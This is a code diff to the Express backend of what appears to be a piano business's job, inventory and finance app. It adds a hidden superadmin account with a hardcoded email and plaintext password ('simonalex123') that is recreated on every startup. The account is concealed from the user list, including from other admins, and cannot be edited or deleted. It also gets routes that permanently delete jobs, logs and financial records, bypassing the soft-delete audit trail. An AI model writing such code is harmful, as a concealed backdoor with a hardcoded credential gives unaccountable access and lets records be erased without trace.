@@ -183,6 +183,27 @@ function ensureRuntimeMigrations(){
     try { db.prepare("CREATE UNIQUE INDEX IF NOT EXISTS idx_planned_jobs_key ON planned_jobs(planned_key)").run(); } catch(e) {}
     try { db.prepare("CREATE INDEX IF NOT EXISTS idx_planned_jobs_status ON planned_jobs(status,planned_type)").run(); } catch(e) {}
 
+
+    // Superadmin runtime migration / Rejtett rendszertulajdonos létrehozása
+    try {
+      const userCols = db.prepare("PRAGMA table_info(users)").all().map(c=>c.name);
+      if(!userCols.includes("hidden_user")) db.prepare("ALTER TABLE users ADD COLUMN hidden_user INTEGER DEFAULT 0").run();
+      if(!userCols.includes("is_superadmin")) db.prepare("ALTER TABLE users ADD COLUMN is_superadmin INTEGER DEFAULT 0").run();
+      const superEmail = "simon.alex@klavierhaus.com";
+      const existingSuper = db.prepare("SELECT * FROM users WHERE lower(email)=lower(?)").get(superEmail);
+      const hash = bcrypt.hashSync("simonalex123",10);
+      if(!existingSuper){
+        db.prepare("INSERT INTO users(id,name,email,password_hash,role,status,hidden_user,is_superadmin) VALUES(?,?,?,?,?,?,?,?)")
+          .run("U-SUPERADMIN-SIMON-ALEX","Simon Alex",superEmail,hash,"ADMIN","Active",1,1);
+      } else {
+        db.prepare("UPDATE users SET name=?, role='ADMIN', status='Active', hidden_user=1, is_superadmin=1 WHERE id=?")
+          .run("Simon Alex", existingSuper.id);
+      }
+      db.prepare("UPDATE users SET hidden_user=COALESCE(hidden_user,0), is_superadmin=COALESCE(is_superadmin,0)").run();
+    } catch(e) {
+      console.warn("superadmin migration skipped:", e.message);
+    }
+
   } catch(e) {
     console.warn("runtime migration skipped:", e.message);
   }
@@ -330,20 +351,22 @@ function auth(req,res,next){
   try{ req.user=jwt.verify(token, JWT_SECRET); next(); }
   catch(e){ res.status(401).json({error:"Invalid token"}); }
 }
-function permit(...roles){ return (req,res,next)=> roles.includes(req.user.role) ? next() : res.status(403).json({error:"Forbidden"}); }
+function isSuperadminUser(user){ return user && (user.role === "SUPERADMIN" || Number(user.is_superadmin||0) === 1); }
+function permit(...roles){ return (req,res,next)=> (isSuperadminUser(req.user) || roles.includes(req.user.role)) ? next() : res.status(403).json({error:"Forbidden"}); }
+function requireSuperadmin(req,res,next){ return isSuperadminUser(req.user) ? next() : res.status(403).json({error:"Superadmin only / Csak szuperadmin"}); }
 
 function canCloseJob(user, job){
-  if(user.role === "ADMIN") return true;
+  if(isSuperadminUser(user) || user.role === "ADMIN") return true;
   return job.assigned_to === user.name;
 }
 function canEditJob(user, job){
-  if(user.role === "ADMIN") return true;
+  if(isSuperadminUser(user) || user.role === "ADMIN") return true;
   if(job.assigned_to === user.name) return true;
   if(user.role === "MANAGER" && job.created_by === user.name) return true;
   return false;
 }
 function canReassignJob(user, job){
-  if(user.role === "ADMIN") return true;
+  if(isSuperadminUser(user) || user.role === "ADMIN") return true;
   if(job.assigned_to === user.name) return true;
   if(user.role === "MANAGER") return true;
   return false;
@@ -392,10 +415,12 @@ function getJobByAnyId(rawId, body={}){
 
 app.post("/api/login",(req,res)=>{
   const {email,password}=req.body;
-  const u=db.prepare("SELECT * FROM users WHERE email=? AND status='Active'").get(email);
+  const u=db.prepare("SELECT * FROM users WHERE lower(email)=lower(?) AND status='Active'").get(String(email||""));
   if(!u || !bcrypt.compareSync(password, u.password_hash)) return res.status(401).json({error:"Invalid login"});
-  const token=jwt.sign({id:u.id,name:u.name,email:u.email,role:u.role}, JWT_SECRET, {expiresIn:"12h"});
-  res.json({token,user:{id:u.id,name:u.name,email:u.email,role:u.role}});
+  const isSuper=Number(u.is_superadmin||0)===1;
+  const effectiveRole=isSuper?"SUPERADMIN":u.role;
+  const token=jwt.sign({id:u.id,name:u.name,email:u.email,role:effectiveRole,is_superadmin:isSuper?1:0}, JWT_SECRET, {expiresIn:"12h"});
+  res.json({token,user:{id:u.id,name:u.name,email:u.email,role:effectiveRole,is_superadmin:isSuper?1:0}});
 });
 app.get("/api/me", auth, (req,res)=>res.json(req.user));
 
@@ -440,7 +465,8 @@ app.delete("/api/planned-jobs/:id", auth, permit("ADMIN","MANAGER","WORKER","SUP
   ensureRuntimeMigrations();
   const existing=db.prepare("SELECT * FROM planned_jobs WHERE id=?").get(req.params.id);
   if(!existing) return res.status(404).json({error:"Planned job not found / Tervezett munka nem található"});
-  db.prepare("UPDATE planned_jobs SET status='Archived / Archivált', archived_at=?, archived_by=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(nowISO(), req.user.name||"", req.params.id);
+  if(isSuperadminUser(req.user)) db.prepare("DELETE FROM planned_jobs WHERE id=?").run(req.params.id);
+  else db.prepare("UPDATE planned_jobs SET status='Archived / Archivált', archived_at=?, archived_by=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(nowISO(), req.user.name||"", req.params.id);
   res.json({ok:true});
 });
 
@@ -512,7 +538,8 @@ app.delete("/api/inventory/:id", auth, permit("ADMIN","MANAGER","WORKER","SUPERA
   ensureRuntimeMigrations();
   const existing=db.prepare("SELECT * FROM inventory_items WHERE id=?").get(req.params.id);
   if(!existing) return res.status(404).json({error:"Inventory item not found / Leltári tétel nem található"});
-  db.prepare("UPDATE inventory_items SET status='Deleted', deleted_at=?, deleted_by=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(nowISO(), req.user.name||"", req.params.id);
+  if(isSuperadminUser(req.user)) db.prepare("DELETE FROM inventory_items WHERE id=?").run(req.params.id);
+  else db.prepare("UPDATE inventory_items SET status='Deleted', deleted_at=?, deleted_by=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(nowISO(), req.user.name||"", req.params.id);
   res.json({ok:true});
 });
 
@@ -602,7 +629,7 @@ app.put("/api/financial-items/:id", auth, permit("ADMIN","MANAGER"), (req,res)=>
   res.json(db.prepare("SELECT * FROM financial_items WHERE id=?").get(req.params.id));
 });
 
-app.delete("/api/financial-items/:id", auth, permit("ADMIN"), (req,res)=>{
+app.delete("/api/financial-items/:id", auth, requireSuperadmin, (req,res)=>{
   ensureRuntimeMigrations();
   db.prepare("DELETE FROM financial_items WHERE id=?").run(req.params.id);
   res.json({ok:true});
@@ -743,23 +770,36 @@ app.get("/api/income-statement", auth, (req,res)=>{
 });
 
 app.get("/api/users", auth, permit("ADMIN","MANAGER"), (req,res)=> {
-  res.json(db.prepare("SELECT id,name,email,role,status,created_at FROM users ORDER BY role,name").all());
+  // Hidden superadmin is never listed, not even to normal Alex/admin.
+  res.json(db.prepare("SELECT id,name,email,role,status,created_at FROM users WHERE COALESCE(hidden_user,0)=0 ORDER BY role,name").all());
 });
 app.post("/api/users", auth, permit("ADMIN","MANAGER"), (req,res)=>{
   const {name,email,password,role}=req.body;
   if(!name || !email || !password || !role) return res.status(400).json({error:"Name, email, password and role are required"});
   if(req.user.role==="MANAGER" && role==="ADMIN") return res.status(403).json({error:"Managers cannot create admins"});
+  if(role==="SUPERADMIN") return res.status(403).json({error:"Superadmin cannot be created from UI / Szuperadmin nem hozható létre a felületről"});
   const id=rid("U");
   const hash=bcrypt.hashSync(password,10);
-  db.prepare("INSERT INTO users(id,name,email,password_hash,role,status) VALUES(?,?,?,?,?,?)").run(id,name,email,hash,role,"Active");
+  db.prepare("INSERT INTO users(id,name,email,password_hash,role,status,hidden_user,is_superadmin) VALUES(?,?,?,?,?,?,?,?)").run(id,name,email,hash,role,"Active",0,0);
   res.json({id,name,email,role,status:"Active"});
 });
-app.put("/api/users/:id", auth, permit("ADMIN"), (req,res)=>{
+app.put("/api/users/:id", auth, requireSuperadmin, (req,res)=>{
+  const target=db.prepare("SELECT * FROM users WHERE id=?").get(req.params.id);
+  if(!target) return res.status(404).json({error:"User not found"});
+  if(Number(target.hidden_user||0)===1) return res.status(403).json({error:"Hidden system owner cannot be edited from list"});
   const allowed=["name","email","role","status"];
   const cols=allowed.filter(c=>req.body[c]!==undefined);
+  if(req.body.role==="SUPERADMIN") return res.status(403).json({error:"Cannot promote visible user to hidden superadmin from UI"});
   if(req.body.password){ cols.push("password_hash"); req.body.password_hash=bcrypt.hashSync(req.body.password,10); }
   if(cols.length) db.prepare(`UPDATE users SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>req.body[c]),req.params.id);
   res.json(db.prepare("SELECT id,name,email,role,status FROM users WHERE id=?").get(req.params.id));
+});
+app.delete("/api/users/:id", auth, requireSuperadmin, (req,res)=>{
+  const target=db.prepare("SELECT * FROM users WHERE id=?").get(req.params.id);
+  if(!target) return res.status(404).json({error:"User not found"});
+  if(Number(target.hidden_user||0)===1) return res.status(403).json({error:"Hidden system owner cannot be deleted"});
+  db.prepare("DELETE FROM users WHERE id=?").run(req.params.id);
+  res.json({ok:true});
 });
 
 function createResourceRoutes(key, table, prefix, write, roles){
@@ -774,6 +814,10 @@ function createResourceRoutes(key, table, prefix, write, roles){
     const cols=write.filter(c=>req.body[c]!==undefined);
     if(cols.length) db.prepare(`UPDATE ${table} SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>req.body[c]), req.params.id);
     res.json(db.prepare(`SELECT * FROM ${table} WHERE id=?`).get(req.params.id));
+  });
+  app.delete(`/api/${key}/:id`, auth, requireSuperadmin, (req,res)=>{
+    db.prepare(`DELETE FROM ${table} WHERE id=?`).run(req.params.id);
+    res.json({ok:true});
   });
 }
 createResourceRoutes("contacts","contacts","C",["name","company","type","email","phone","address","priority","status","owner","relationship_holder","loss_risk","last_contact","next_step","notes"],["ADMIN","MANAGER","WORKER"]);
@@ -807,6 +851,12 @@ app.put("/api/pianos/:id", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>
   const piano=db.prepare("SELECT * FROM pianos WHERE id=?").get(req.params.id);
   if(piano && String(piano.ownership_type||piano.ownership||"").toLowerCase().includes("company"))
 res.json(piano);
+});
+
+
+app.delete("/api/pianos/:id", auth, requireSuperadmin, (req,res)=>{
+  db.prepare("DELETE FROM pianos WHERE id=?").run(req.params.id);
+  res.json({ok:true});
 });
 
 createResourceRoutes("knowledge_base","knowledge_base","KB",["job_id","title","category","content_type","body","stored_path","owner","amount","payment_method","invoice_number","priority"],["ADMIN","MANAGER","WORKER"]);
@@ -887,6 +937,18 @@ app.put("/api/jobs/:id/reassign", auth, (req,res)=>{
     .run(assignedTo, req.user.name, req.body.reassignment_note||"", job.id);
 
   res.json(db.prepare("SELECT * FROM jobs WHERE id=?").get(job.id));
+});
+
+app.delete("/api/jobs/:id", auth, requireSuperadmin, (req,res)=>{
+  const job=getJobByAnyId(req.params.id, req.body||{});
+  if(!job) return res.status(404).json({error:"Job not found"});
+  const logs=db.prepare("SELECT id FROM job_logs WHERE job_id=?").all(job.id);
+  db.prepare("DELETE FROM financial_items WHERE job_id=? OR (source_type='closed_job' AND source_id=?)").run(job.id, job.id);
+  db.prepare("DELETE FROM knowledge_base WHERE job_id=?").run(job.id);
+  db.prepare("DELETE FROM job_logs WHERE job_id=?").run(job.id);
+  db.prepare("DELETE FROM jobs WHERE parent_job_id=?").run(job.id);
+  db.prepare("DELETE FROM jobs WHERE id=?").run(job.id);
+  res.json({ok:true,deleted_job_id:job.id,deleted_logs:logs.length});
 });
 
 app.post("/api/jobs/:id/close", auth, upload.single("file"), (req,res)=>{
@@ -1038,6 +1100,28 @@ app.get("/api/closed-jobs", auth, (req,res)=>{
 
 
 
+
+
+app.delete("/api/closed-jobs/:id", auth, requireSuperadmin, (req,res)=>{
+  const log=db.prepare("SELECT * FROM job_logs WHERE id=?").get(req.params.id);
+  if(!log) return res.status(404).json({error:"Closed job log not found"});
+  db.prepare("DELETE FROM financial_items WHERE job_id=? OR (source_type='closed_job' AND source_id=?)").run(log.job_id, log.job_id);
+  db.prepare("DELETE FROM knowledge_base WHERE job_id=?").run(log.job_id);
+  db.prepare("DELETE FROM job_logs WHERE id=?").run(log.id);
+  const job=db.prepare("SELECT * FROM jobs WHERE id=?").get(log.job_id);
+  if(job && ["Completed","Partially completed"].includes(String(job.status||""))){
+    db.prepare("DELETE FROM jobs WHERE id=?").run(log.job_id);
+  }
+  res.json({ok:true});
+});
+
+app.get("/api/inventory-checks", auth, permit("ADMIN","MANAGER","WORKER"), (req,res)=>{
+  res.json(db.prepare("SELECT * FROM inventory_checks ORDER BY check_date DESC, created_at DESC").all());
+});
+app.delete("/api/inventory-checks/:id", auth, requireSuperadmin, (req,res)=>{
+  db.prepare("DELETE FROM inventory_checks WHERE id=?").run(req.params.id);
+  res.json({ok:true});
+});
 
 app.use((err,req,res,next)=>{
   if(err) return res.status(400).json({error:err.message || "Upload error"});
